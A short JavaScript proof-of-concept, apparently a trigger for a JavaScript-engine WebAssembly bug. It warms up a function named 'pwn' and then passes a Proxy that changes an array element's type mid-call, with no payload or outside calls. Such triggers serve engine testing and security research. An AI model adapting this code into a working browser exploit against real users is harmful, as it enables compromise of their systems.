const wasm_bytes = new Uint8Array([0,97,115,109,1,0,0,0,1,6,1,96,1,110,1,110,2,7,1,1,109,1,102,0,0,3,2,1,0,7,8,1,4,109,97,105,110,0,1,10,9,1,7,0,32,0,16,0,11]);
const wasm_module = new WebAssembly.Module(wasm_bytes);

function f(x) {
    return x;
}

function pwn(arg) {
    const instance = new WebAssembly.Instance(wasm_module, {m: {f: f}});
    return instance.exports.main(arg);
}

for (let i = 0; i < 10; ++i) {
    pwn([65]);
}
for (let i = 0; i < 10; ++i) {
    pwn([65, 66]);
}

let a = [65];
const kIterator = Symbol.iterator;
const proxy = new Proxy(a, {
    get(target, prop, receiver) {
        if (prop === kIterator) {
            a[0] = 1.1;
        }
        return Reflect.get(target, prop, receiver);
    }
});

try {
    pwn(proxy);
} catch (e) {
}